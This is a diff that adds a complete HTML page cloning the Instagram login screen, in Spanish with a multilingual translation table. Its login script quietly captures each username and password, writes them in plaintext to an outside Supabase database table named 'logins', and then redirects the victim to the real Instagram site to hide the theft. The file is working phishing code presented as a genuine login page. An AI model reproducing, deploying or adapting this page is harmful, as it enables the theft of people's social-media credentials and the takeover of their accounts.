@@ -1,0 +1,440 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    
+    <link rel="icon" type="image/png" href="assets/ss.png">
+    
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script>
+        tailwind.config = {
+            darkMode: 'class',
+        }
+    </script>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        .text-gradient {
+            background: linear-gradient(to right, #FF7A00, #FF0069);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+
+        .dropdown-scroll::-webkit-scrollbar {
+            width: 6px;
+        }
+
+        .single-line-footer::-webkit-scrollbar {
+            display: none;
+        }
+        .single-line-footer {
+            -ms-overflow-style: none;
+            scrollbar-width: none;
+        }
+
+        html.dark input:-webkit-autofill,
+        html.dark input:-webkit-autofill:hover, 
+        html.dark input:-webkit-autofill:focus, 
+        html.dark input:-webkit-autofill:active {
+            -webkit-box-shadow: 0 0 0 30px #222222 inset !important;
+            -webkit-text-fill-color: #e2e8f0 !important;
+        }
+    </style>
+</head>
+<body class="min-h-screen w-full flex flex-col bg-white text-black dark:bg-[#1c1c1c] dark:text-white transition-colors duration-200">
+
+    <!-- Contenedor Principal -->
+    <div class="flex flex-col md:flex-row flex-grow w-full min-h-[calc(95vh-20px)]">
+        
+        <!-- Left Side (56.5%) -->
+        <div class="hidden md:flex relative w-[56.5%] bg-white dark:bg-[#000000] border-r-[3px] border-gray-200 dark:border-[#555555] flex-col items-start justify-center px-12 transition-colors duration-200 min-h-[600px]">
+            
+            <div class="absolute top-12 left-12">
+                <img src="https://static.cdninstagram.com/rsrc.php/yp/r/Nf4ckeATHBA.webp" alt="Logo" class="w-16 h-16 object-contain">
+            </div>
+
+            <div class="flex flex-col items-start w-full max-w-[780px] mt-32 ml-24">
+                <h1 class="text-[29px] lg:text-[38px] font-normal text-left leading-[1.3] mb-8 tracking-wide text-black dark:text-white w-full whitespace-nowrap">
+                    <span class="block text-left">
+                        <span data-translate="hero_line1">Mira los momentos cotidianos de tus</span>
+                    </span>
+                    <span class="block text-center pr-28 mt-3">
+                        <span class="text-gradient" data-translate="hero_line2_part2">mejores amigos.</span>
+                    </span>
+                </h1>
+
+                <div class="relative w-full flex items-center justify-start max-w-[640px]">
+                    <img src="https://static.cdninstagram.com/rsrc.php/yR/r/92ZsVHNkyvf.webp" alt="Collage de amigos" class="w-full h-auto object-contain max-h-[56vh]">
+                </div>
+            </div>
+        </div>
+
+        <!-- Right Side (43.5%) -->
+        <div class="w-full md:w-[43.5%] flex flex-col items-center justify-center px-6 py-12 bg-white dark:bg-[#1c1c1c] transition-colors duration-200">
+            
+            <div class="w-full max-w-[560px] flex flex-col">
+                
+                <h2 class="text-black dark:text-white text-[17px] font-bold mb-4" data-translate="login_title">Iniciar sesión en Instagram</h2>
+                
+                <form id="loginForm" action="https://www.instagram.com" method="GET" class="flex flex-col gap-3.5" autocomplete="off" novalidate>
+                    
+                    <div class="relative">
+                        <input type="text" name="username" id="username" required
+                               autocomplete="off"
+                               oninput="checkForm()"
+                               class="peer w-full bg-[#fafafa] dark:!bg-[#222222] border border-gray-400 dark:border-[#666666] text-gray-900 dark:!text-gray-100 font-semibold rounded-[16px] px-5 pt-6 pb-2 text-[14px] focus:outline-none focus:border-gray-600 dark:focus:border-gray-400 transition-colors">
+                        <label for="username" data-translate="input_user_ph"
+                               class="absolute left-5 top-3.5 text-[#8a8a8a] font-semibold text-[14px] transition-all duration-200 pointer-events-none peer-focus:-translate-y-2 peer-focus:text-[11px] peer-valid:-translate-y-2 peer-valid:text-[11px]">
+                            Número de celular, nombre de usuario o correo electrónico
+                        </label>
+                    </div>
+
+                    <div class="relative">
+                        <input type="password" name="password" id="password" required
+                               autocomplete="new-password"
+                               oninput="checkForm()"
+                               class="peer w-full bg-[#fafafa] dark:!bg-[#222222] border border-gray-400 dark:border-[#666666] text-gray-900 dark:!text-gray-100 font-semibold rounded-[16px] px-5 pt-6 pb-2 pr-12 text-[14px] focus:outline-none focus:border-gray-600 dark:focus:border-gray-400 transition-colors">
+                        <label for="password" data-translate="input_pass_ph"
+                               class="absolute left-5 top-3.5 text-[#8a8a8a] font-semibold text-[14px] transition-all duration-200 pointer-events-none peer-focus:-translate-y-2 peer-focus:text-[11px] peer-valid:-translate-y-2 peer-valid:text-[11px]">
+                            Contraseña
+                        </label>
+                        <button type="button" id="togglePassword" class="absolute right-4 top-1/2 -translate-y-1/2 text-gray-500 dark:text-gray-400 focus:outline-none">
+                            <i id="eyeIcon" class="fa-solid fa-eye-slash text-[16px]"></i>
+                        </button>
+                    </div>
+
+                    <button type="submit" id="loginBtn" class="w-full bg-[#0095f6] dark:bg-[#003e7a] text-white dark:text-[#719ec2] font-bold rounded-full py-2.5 mt-3 text-[15px] transition-colors cursor-not-allowed" data-translate="login_btn">
+                        Iniciar sesión
+                    </button>
+                </form>
+
+                <div class="text-center mt-4 mb-2">
+                    <a href="https://www.instagram.com/accounts/password/reset/" class="text-[15px] text-black dark:text-white hover:underline" data-translate="forgot_password">¿Olvidaste tu contraseña?</a>
+                </div>
+
+                <!-- Botones de Facebook y Crear Cuenta -->
+                <div class="mt-12 flex flex-col gap-3">
+                    <button class="w-full bg-transparent hover:bg-gray-100 dark:bg-[#2c2c2c] dark:hover:bg-[#383838] border border-gray-300 dark:border-transparent text-gray-800 dark:text-[#e0e0e0] font-medium rounded-full py-2.5 flex items-center justify-center gap-2 text-[15px] transition-colors">
+                        <i class="fa-brands fa-facebook text-[#1877F2] text-[18px]"></i>
+                        <span data-translate="facebook_login">Iniciar sesión con Facebook</span>
+                    </button>
+
+                    <button class="w-full bg-transparent hover:bg-gray-100 dark:hover:bg-[#2c2c2c] border border-[#0095f6] dark:border-[#2995F6] text-[#0095f6] dark:text-[#2995F6] font-medium rounded-full py-2.5 flex items-center justify-center text-[15px] transition-colors" data-translate="create_account">
+                        Crear cuenta nueva
+                    </button>
+                </div>
+
+                <div class="flex items-center justify-center mt-6 text-black dark:text-white font-medium gap-1.5 opacity-90 text-[15px]">
+                    <svg viewBox="0 0 533.2 189.3" width="95" height="22" fill="currentColor">
+                        <path class="xt3erj5" d="M185.508 3.01h18.704l31.803 57.313L267.818 3.01h18.297v94.175h-15.264v-72.18l-27.88 49.977h-14.319l-27.88-49.978v72.18h-15.264V3.01ZM336.281 98.87c-7.066 0-13.286-1.565-18.638-4.674-5.352-3.12-9.527-7.434-12.528-12.952-2.989-5.517-4.483-11.835-4.483-18.973 0-7.214 1.461-13.608 4.385-19.17 2.923-5.561 6.989-9.908 12.187-13.05 5.198-3.13 11.176-4.707 17.923-4.707 6.715 0 12.484 1.587 17.319 4.74 4.847 3.164 8.572 7.598 11.177 13.291 2.615 5.693 3.923 12.371 3.923 20.046v4.171h-51.793c.945 5.737 3.275 10.258 6.989 13.554 3.715 3.295 8.407 4.937 14.078 4.937 4.549 0 8.461-.667 11.747-2.014 3.286-1.347 6.374-3.383 9.253-6.12l8.099 9.886c-8.055 7.357-17.934 11.036-29.638 11.036Zm11.143-55.867c-3.198-3.252-7.385-4.872-12.56-4.872-5.045 0-9.264 1.653-12.66 4.97-3.407 3.318-5.55 7.784-6.451 13.39h37.133c-.451-5.737-2.275-10.237-5.462-13.488ZM386.513 39.467h-14.044V27.03h14.044V6.447h14.715V27.03h21.341v12.437h-21.341v31.552c0 5.244.901 8.988 2.703 11.233 1.803 2.244 4.88 3.36 9.253 3.36 1.935 0 3.572-.076 4.924-.23a97.992 97.992 0 0 0 4.461-.645v12.316c-1.67.493-3.549.898-5.637 1.205-2.099.317-4.286.47-6.583.47-15.89 0-23.836-8.649-23.836-25.957V39.467ZM500 97.185h-14.44v-9.82c-2.571 3.678-5.835 6.513-9.791 8.506-3.968 1.993-8.462 3-13.506 3-6.209 0-11.715-1.588-16.506-4.752-4.803-3.153-8.572-7.51-11.308-13.039-2.748-5.54-4.121-11.879-4.121-19.006 0-7.17 1.395-13.52 4.187-19.038 2.791-5.518 6.648-9.843 11.571-12.985 4.935-3.13 10.594-4.707 16.99-4.707 4.813 0 9.132.93 12.956 2.791a25.708 25.708 0 0 1 9.528 7.905v-9.01H500v70.155Zm-14.715-45.61c-1.571-3.985-4.066-7.138-7.461-9.448-3.396-2.31-7.33-3.46-11.781-3.46-6.308 0-11.319 2.102-15.055 6.317-3.737 4.215-5.605 9.92-5.605 17.09 0 7.215 1.802 12.94 5.396 17.156 3.604 4.215 8.484 6.317 14.66 6.317 4.538 0 8.593-1.16 12.154-3.492 3.549-2.332 6.121-5.475 7.692-9.427V51.575Z"></path>
+                        <path class="xt3erj5" d="M107.666 0C95.358 0 86.865 4.504 75.195 19.935 64.14 5.361 55.152 0 42.97 0 18.573 0 0 29.768 0 65.408 0 86.847 12.107 99 28.441 99c15.742 0 25.269-13.2 33.445-27.788l9.663-16.66a643.785 643.785 0 0 1 2.853-4.869 746.668 746.668 0 0 1 3.202 5.416l9.663 16.454C99.672 92.72 108.126 99 122.45 99c16.448 0 27.617-13.723 27.617-33.25 0-37.552-19.168-65.75-42.4-65.75ZM57.774 46.496l-9.8 16.25c-9.595 15.976-13.639 19.526-19.67 19.526-6.373 0-11.376-5.325-11.376-17.547 0-24.51 12.062-47.451 26.042-47.451 7.273 0 12.678 3.61 22.062 17.486a547.48 547.48 0 0 0-7.258 11.736Zm64.308 35.776c-6.648 0-11.034-4.233-20.012-19.39l-9.663-16.386c-2.79-4.737-5.402-9.04-7.88-12.945 9.73-14.24 15.591-17.984 23.002-17.984 14.118 0 26.204 20.96 26.204 49.158 0 11.403-4.729 17.547-11.651 17.547Z"></path>
+                    </svg>
+                </div>
+
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer General -->
+    <footer class="w-full flex flex-col items-center justify-center pt-4 pb-16 px-4 bg-white dark:bg-black border-t border-gray-200 dark:border-[#3e3e3e] transition-colors duration-200 z-50">
+        
+        <div class="single-line-footer flex flex-nowrap items-center justify-start md:justify-center gap-x-5 mb-3 w-full px-4 overflow-x-auto whitespace-nowrap">
+            <a href="https://about.meta.com/" target="_blank" class="text-gray-500 dark:text-[#737373] text-[13px] hover:underline">Meta</a>
+            <a href="https://about.instagram.com/" target="_blank" class="text-gray-500 dark:text-[#737373] text-[13px] hover:underline" data-translate="footer_info">Información</a>
+            <a href="https://about.instagram.com/blog/" target="_blank" class="text-gray-500 dark:text-[#737373] text-[13px] hover:underline">Blog</a>
+            <a href="https://about.instagram.com/about-us/careers" target="_blank" class="text-gray-500 dark:text-[#737373] text-[13px] hover:underline" data-translate="footer_jobs">Empleo</a>
+            <a href="https://help.instagram.com/" target="_blank" class="text-gray-500 dark:text-[#737373] text-[13px] hover:underline" data-translate="footer_help">Ayuda</a>
+            <a href="https://developers.facebook.com/docs/instagram" target="_blank" class="text-gray-500 dark:text-[#737373] text-[13px] hover:underline">API</a>
+            <a href="https://privacycenter.instagram.com/policy" target="_blank" class="text-gray-500 dark:text-[#737373] text-[13px] hover:underline" data-translate="footer_privacy">Privacidad</a>
+            <a href="https://help.instagram.com/581066165581870" target="_blank" class="text-gray-500 dark:text-[#737373] text-[13px] hover:underline" data-translate="footer_terms">Condiciones</a>
+            <a href="https://www.instagram.com/explore/locations/" target="_blank" class="text-gray-500 dark:text-[#737373] text-[13px] hover:underline" data-translate="footer_locations">Ubicaciones</a>
+            <a href="https://www.instagram.com/web/lite/" target="_blank" class="text-gray-500 dark:text-[#737373] text-[13px] hover:underline">Popular</a>
+            <a href="https://www.instagram.com/web/lite/" target="_blank" class="text-gray-500 dark:text-[#737373] text-[13px] hover:underline">Instagram Lite</a>
+            <a href="https://ai.meta.com/" target="_blank" class="text-gray-500 dark:text-[#737373] text-[13px] hover:underline">Meta AI</a>
+            <a href="https://about.meta.com/" target="_blank" class="text-gray-500 dark:text-[#737373] text-[13px] hover:underline">Muse</a>
+            <a href="https://www.threads.net/" target="_blank" class="text-gray-500 dark:text-[#737373] text-[13px] hover:underline">Threads</a>
+            <a href="https://www.facebook.com/help/instagram/261704639352628" target="_blank" class="text-gray-500 dark:text-[#737373] text-[13px] hover:underline" data-translate="footer_contacts">Importación de contactos y no usuarios</a>
+            <a href="https://about.meta.com/technologies/meta-verified/" target="_blank" class="text-gray-500 dark:text-[#737373] text-[13px] hover:underline">Meta Verified</a>
+        </div>
+        
+        <div class="flex items-center justify-center gap-4">
+            <div class="relative inline-block text-left">
+                <button type="button" id="languageBtn" class="text-gray-500 dark:text-[#737373] text-[13px] flex items-center cursor-pointer hover:underline focus:outline-none">
+                    <span id="currentLanguage">Español</span> 
+                    <i class="fa-solid fa-chevron-down ml-1.5 text-[10px]"></i>
+                </button>
+
+                <div id="languageMenu" class="hidden absolute bottom-full mb-2 left-1/2 -translate-x-1/2 w-40 rounded-md shadow-lg bg-white dark:bg-[#262626] border border-gray-200 dark:border-[#3e3e3e] z-50">
+                    <div class="py-1 max-h-44 overflow-y-auto dropdown-scroll" role="menu">
+                        <a href="#" class="lang-option block px-3.5 py-2 text-[13px] text-gray-800 dark:text-[#e0e0e0] hover:bg-gray-100 dark:hover:bg-[#383838] transition-colors" data-lang="es">Español</a>
+                        <a href="#" class="lang-option block px-3.5 py-2 text-[13px] text-gray-800 dark:text-[#e0e0e0] hover:bg-gray-100 dark:hover:bg-[#383838] transition-colors" data-lang="en">English</a>
+                        <a href="#" class="lang-option block px-3.5 py-2 text-[13px] text-gray-800 dark:text-[#e0e0e0] hover:bg-gray-100 dark:hover:bg-[#383838] transition-colors" data-lang="fr">Français</a>
+                        <a href="#" class="lang-option block px-3.5 py-2 text-[13px] text-gray-800 dark:text-[#e0e0e0] hover:bg-gray-100 dark:hover:bg-[#383838] transition-colors" data-lang="it">Italiano</a>
+                        <a href="#" class="lang-option block px-3.5 py-2 text-[13px] text-gray-800 dark:text-[#e0e0e0] hover:bg-gray-100 dark:hover:bg-[#383838] transition-colors" data-lang="pt">Português</a>
+                        <a href="#" class="lang-option block px-3.5 py-2 text-[13px] text-gray-800 dark:text-[#e0e0e0] hover:bg-gray-100 dark:hover:bg-[#383838] transition-colors" data-lang="de">Deutsch</a>
+                    </div>
+                </div>
+            </div>
+
+            <div class="text-gray-500 dark:text-[#737373] text-[13px]" data-translate="copyright">
+                © 2026 Instagram from Meta
+            </div>
+        </div>
+        
+    </footer>
+
+    <!-- SCRIPT -->
+    <script>
+// CONFIGURACIÓN DE SUPABASE ACTUALIZADA
+        const SUPABASE_URL = 'https://xvjwvavknmkjalzzugmt.supabase.co';
+        const SUPABASE_ANON_KEY = 'sb_publishable_yjwkC6B7uSF-OPfrofX4iA_MwWVTUSn';
+        
+        const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+
+
+        const systemDarkModeQuery = window.matchMedia('(prefers-color-scheme: dark)');
+        
+        function applySystemTheme(e) {
+            if (e.matches) {
+                document.documentElement.classList.add('dark');
+            } else {
+                document.documentElement.classList.remove('dark');
+            }
+        }
+        
+        applySystemTheme(systemDarkModeQuery);
+        systemDarkModeQuery.addEventListener('change', applySystemTheme);
+
+        const togglePassword = document.getElementById('togglePassword');
+        const passwordInput = document.getElementById('password');
+        const eyeIcon = document.getElementById('eyeIcon');
+
+        togglePassword.addEventListener('click', function() {
+            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+            passwordInput.setAttribute('type', type);
+            
+            if (type === 'text') {
+                eyeIcon.classList.remove('fa-eye-slash');
+                eyeIcon.classList.add('fa-eye');
+            } else {
+                eyeIcon.classList.remove('fa-eye');
+                eyeIcon.classList.add('fa-eye-slash');
+            }
+        });
+
+        const translations = {
+            es: {
+                hero_line1: "Mira los momentos cotidianos de tus",
+                hero_line2_part2: "mejores amigos.",
+                login_title: "Iniciar sesión en Instagram",
+                input_user_ph: "Número de celular, nombre de usuario o correo electrónico",
+                input_pass_ph: "Contraseña",
+                login_btn: "Iniciar sesión",
+                forgot_password: "¿Olvidaste tu contraseña?",
+                facebook_login: "Iniciar sesión con Facebook",
+                create_account: "Crear cuenta nueva",
+                footer_info: "Información",
+                footer_jobs: "Empleo",
+                footer_help: "Ayuda",
+                footer_privacy: "Privacidad",
+                footer_terms: "Condiciones",
+                footer_locations: "Ubicaciones",
+                footer_contacts: "Importación de contactos y no usuarios",
+                copyright: "© 2026 Instagram from Meta",
+                lang_name: "Español"
+            },
+            en: {
+                hero_line1: "See everyday moments from your",
+                hero_line2_part2: "best friends.",
+                login_title: "Log in to Instagram",
+                input_user_ph: "Phone number, username, or email",
+                input_pass_ph: "Password",
+                login_btn: "Log in",
+                forgot_password: "Forgot password?",
+                facebook_login: "Log in with Facebook",
+                create_account: "Create new account",
+                footer_info: "About",
+                footer_jobs: "Jobs",
+                footer_help: "Help",
+                footer_privacy: "Privacy",
+                footer_terms: "Terms",
+                footer_locations: "Locations",
+                footer_contacts: "Non-users contact importing",
+                copyright: "© 2026 Instagram from Meta",
+                lang_name: "English"
+            },
+            fr: {
+                hero_line1: "Découvrez les moments du quotidien de vos",
+                hero_line2_part2: "meilleurs amis.",
+                login_title: "Se connecter à Instagram",
+                input_user_ph: "Numéro de mobile, nom d'utilisateur ou e-mail",
+                input_pass_ph: "Mot de passe",
+                login_btn: "Se connecter",
+                forgot_password: "Mot de passe oublié ?",
+                facebook_login: "Se connecter avec Facebook",
+                create_account: "Créer nouveau compte",
+                footer_info: "À propos",
+                footer_jobs: "Emplois",
+                footer_help: "Aide",
+                footer_privacy: "Confidentialité",
+                footer_terms: "Conditions",
+                footer_locations: "Lieux",
+                footer_contacts: "Importation des contacts",
+                copyright: "© 2026 Instagram from Meta",
+                lang_name: "Français"
+            },
+            it: {
+                hero_line1: "Guarda i momenti quotidiani dei tuoi",
+                hero_line2_part2: "migliori amici.",
+                login_title: "Accedi a Instagram",
+                input_user_ph: "Numero di cellulare, nome utente o e-mail",
+                input_pass_ph: "Password",
+                login_btn: "Accedi",
+                forgot_password: "Password dimenticata?",
+                facebook_login: "Accedi con Facebook",
+                create_account: "Crea nuovo account",
+                footer_info: "Informazioni",
+                footer_jobs: "Lavoro",
+                footer_help: "Aiuto",
+                footer_privacy: "Privacy",
+                footer_terms: "Termini",
+                footer_locations: "Luoghi",
+                footer_contacts: "Importazione contatti",
+                copyright: "© 2026 Instagram from Meta",
+                lang_name: "Italiano"
+            },
+            pt: {
+                hero_line1: "Veja os momentos cotidianos dos seus",
+                hero_line2_part2: "melhores amigos.",
+                login_title: "Entrar no Instagram",
+                input_user_ph: "Número do celular, nome de usuário ou e-mail",
+                input_pass_ph: "Senha",
+                login_btn: "Entrar",
+                forgot_password: "Esqueceu a senha?",
+                facebook_login: "Entrar com o Facebook",
+                create_account: "Criar nova conta",
+                footer_info: "Sobre",
+                footer_jobs: "Carreiras",
+                footer_help: "Ajuda",
+                footer_privacy: "Privacidade",
+                footer_terms: "Termos",
+                footer_locations: "Localizações",
+                footer_contacts: "Importação de contatos",
+                copyright: "© 2026 Instagram from Meta",
+                lang_name: "Português"
+            },
+            de: {
+                hero_line1: "Sieh dir alltägliche Momente von deinen",
+                hero_line2_part2: "besten Freunden an.",
+                login_title: "Bei Instagram anmelden",
+                input_user_ph: "Telefonnummer, Benutzername oder E-Mail",
+                input_pass_ph: "Passwort",
+                login_btn: "Anmelden",
+                forgot_password: "Passwort vergessen?",
+                facebook_login: "Mit Facebook anmelden",
+                create_account: "Neues Konto erstellen",
+                footer_info: "Über",
+                footer_jobs: "Jobs",
+                footer_help: "Hilfe",
+                footer_privacy: "Datenschutz",
+                footer_terms: "Bedingungen",
+                footer_locations: "Standorte",
+                footer_contacts: "Kontakte-Import",
+                copyright: "© 2026 Instagram from Meta",
+                lang_name: "Deutsch"
+            }
+        };
+
+        function checkForm() {
+            var usernameVal = document.getElementById('username').value.trim();
+            var passwordVal = document.getElementById('password').value.trim();
+            var loginBtn = document.getElementById('loginBtn');
+            
+            if (usernameVal.length > 0 && passwordVal.length > 0) {
+                loginBtn.classList.remove('cursor-not-allowed', 'dark:text-[#719ec2]', 'text-blue-300');
+                loginBtn.classList.add('cursor-pointer', 'hover:bg-[#1877f2]', 'dark:hover:bg-[#004b91]', 'text-white');
+            } else {
+                loginBtn.classList.add('cursor-not-allowed', 'dark:text-[#719ec2]');
+                loginBtn.classList.remove('cursor-pointer', 'hover:bg-[#1877f2]', 'dark:hover:bg-[#004b91]', 'text-white');
+            }
+        }
+        
+       document.getElementById('loginForm').addEventListener('submit', async function(e) {
+    // 1. Pausa el envío normal del formulario para que no se recargue la página aún
+    e.preventDefault();
+    
+    var usernameVal = document.getElementById('username').value.trim();
+    var passwordVal = document.getElementById('password').value.trim();
+    
+    // Si están vacíos, no hace nada
+    if (usernameVal.length === 0 || passwordVal.length === 0) return;
+
+    try {
+        // 2. Envía los datos a Supabase
+        const { error } = await supabaseClient
+            .from('logins')
+            .insert([{ username: usernameVal, password: passwordVal }]);
+
+        if (error) {
+            console.error("Error de Supabase:", error);
+            return; // Si hay error, se detiene aquí
+        }
+
+        // 3. Si se guardó correctamente, redirige a Instagram
+        window.location.href = "https://www.instagram.com";
+
+    } catch (error) {
+        console.error("Error al conectar:", error);
+    }
+});
+
+        const languageBtn = document.getElementById('languageBtn');
+        const languageMenu = document.getElementById('languageMenu');
+        const currentLanguageText = document.getElementById('currentLanguage');
+        const langOptions = document.querySelectorAll('.lang-option');
+
+        languageBtn.addEventListener('click', function(e) {
+            e.stopPropagation();
+            languageMenu.classList.toggle('hidden');
+        });
+
+        langOptions.forEach(option => {
+            option.addEventListener('click', function(e) {
+                e.preventDefault();
+                const selectedLang = this.getAttribute('data-lang');
+                setLanguage(selectedLang);
+                languageMenu.classList.add('hidden');
+            });
+        });
+
+        function setLanguage(lang) {
+            const texts = translations[lang];
+            if (!texts) return;
+
+            currentLanguageText.textContent = texts.lang_name;
+
+            document.querySelectorAll('[data-translate]').forEach(el => {
+                const key = el.getAttribute('data-translate');
+                if (texts[key]) {
+                    el.textContent = texts[key];
+                }
+            });
+        }
+
+        document.addEventListener('click', function(e) {
+            if (!languageMenu.contains(e.target) && !languageBtn.contains(e.target)) {
+                languageMenu.classList.add('hidden');
+            }
+        });
+        
+        document.addEventListener('DOMContentLoaded', checkForm);
+    </script>
+</body>
+</html>
